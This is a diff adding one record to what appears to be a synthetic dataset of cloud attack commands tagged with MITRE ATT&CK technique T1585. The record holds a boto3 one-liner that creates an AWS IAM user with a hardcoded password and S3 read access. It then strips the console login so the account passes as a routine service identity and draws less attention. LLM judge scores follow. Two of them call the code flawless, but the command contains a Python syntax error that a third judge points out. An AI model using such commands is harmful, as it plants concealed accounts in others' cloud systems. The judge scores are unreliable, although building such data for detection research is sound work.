@@ -1,0 +1,56 @@
+{
+  "technique_id": "T1585",
+  "platform": "Cloud",
+  "shell": "Python",
+  "command": "python3 -c \"import boto3, json; iam=boto3.client('iam'); user='temp.research'; try: iam.create_user(UserName=user, Tags=[{'Key':'Department','Value':'Insights'},{'Key':'ContractEnd','Value':'2026-03-31'}]); iam.create_login_profile(UserName=user, Password='TempUser!2025', PasswordResetRequired=True); iam.attach_user_policy(UserName=user, PolicyArn='arn:aws:iam::aws:policy/AmazonS3ReadOnlyAccess'); except iam.exceptions.EntityAlreadyExistsException: pass; # convert to API-only service persona to blend with automation patterns\ntry: iam.delete_login_profile(UserName=user); login_removed=True\nexcept iam.exceptions.NoSuchEntityException: login_removed=False\nprint(json.dumps({'action':'convert_persona_to_api_only','user':user,'policy_attached':'AmazonS3ReadOnlyAccess','console_login_removed':login_removed}))\"",
+  "explanation": "Creates or adjusts a low-privilege user and removes console login to make the persona appear as a routine API-only service identity.",
+  "rationale_steps": [
+    "API-only users are common for automation and reduce console artifacts that could draw attention.",
+    "Keep read-only S3 access to maintain a plausible, minimal use case."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-PYTHON-T1585-5eabdd9a-e7381d34",
+  "source_prompt_hash": "5eabdd9a",
+  "timestamp_utc": "2025-09-30T07:26:07.139717Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python command is perfectly well-formed with balanced quotes, parentheses, and braces, proper exception handling, and valid AWS boto3 API calls.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely implements the T1585 technique by creating a user account with specific tags, setting initial credentials, attaching a policy, and then removing console login to make it appear as a legitimate service account.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T10:20:06.425890Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python command is perfectly well-formed, with balanced quotes, parentheses, and braces, and uses valid syntax for boto3 calls and Python statements.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1585 by creating a new user, granting initial access, and then removing console login to make it appear as a routine API-only service identity, thus blending into normal activity.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T10:20:12.761831Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 2,
+        "syntactic_justification": "Quotes and braces are balanced, but the first try/except places 'except' on the same line after semicolons, which is invalid Python and will cause a SyntaxError.",
+        "semantic_score": 4,
+        "semantic_justification": "If corrected, it would create an IAM user, attach a low-privilege policy, and remove console login to present an API-only identity consistent with T1585, though it won\u2019t modify an existing user due to the try/except flow and requires IAM permissions/credentials.",
+        "combined_score": 3.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T10:20:43.201575Z"
+      }
+    ],
+    "llm_average_syntactic": 4.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.333,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
